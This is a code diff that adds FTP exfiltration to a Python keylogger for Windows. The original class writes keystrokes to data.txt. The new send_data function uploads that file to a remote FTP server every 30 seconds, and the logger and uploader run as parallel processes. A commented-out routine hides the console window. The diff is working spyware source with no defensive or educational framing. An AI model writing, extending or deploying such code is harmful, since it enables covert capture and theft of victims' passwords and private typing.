@@ -4,6 +4,19 @@ import ctypes
 import os
 import win32process
 import time
+import ftplib
+from multiprocessing import Process
+
+filename = 'data.txt'
+delay = 30
+
+ftp_data = {
+    'address': 'ADDRESS',
+    'username': 'USERNAME',
+    'password': 'PASSWORD',
+    'save_path': 'PATH'
+}
+
 
 vk_to_str = {
     8: ' <back> ', 
@@ -191,7 +204,7 @@ class KeyLogger:
                     else:
                         s = s.capitalize()
 
-            self.append_to_file('data.txt', s)
+            self.append_to_file(filename, s)
 
         listener.add_combination([Key.ctrl_l, Key.alt_l, KeyCode(vk=72)], self.close)
         listener.listen(pressed_callback=pressed_callback)
@@ -215,6 +228,43 @@ def kill_console():
         os.system('taskkill /PID ' + str(pid) + ' /f')
 
 
+def send_data():
+    ftp_address = ftp_data['address']
+    username = ftp_data['username']
+    password = ftp_data['password']
+    save_path = ftp_data['save_path']
+
+    session = ftplib.FTP(ftp_address, username, password)
+    session.cwd(save_path)
+
+    current_time = 0
+    last_time = 0
+
+    while(True):
+        current_time = time.time()
+        if current_time - last_time > delay:
+            try:
+                with open(filename, 'rb') as file:
+                    session.storbinary('STOR ' + filename, file)
+                    print('file sent')
+                    file.close()
+
+            except IOError:
+                print('File not found')
+
+            last_time = current_time
+
+    session.quit()
+
+
 if __name__ == "__main__":
     #kill_console()
-    KeyLogger().listen()
+
+    logging_process = Process(target=KeyLogger().listen)
+    logging_process.start()
+
+    sending_process = Process(target=send_data)
+    sending_process.start()
+
+    for p in [logging_process, sending_process]:
+        p.join()
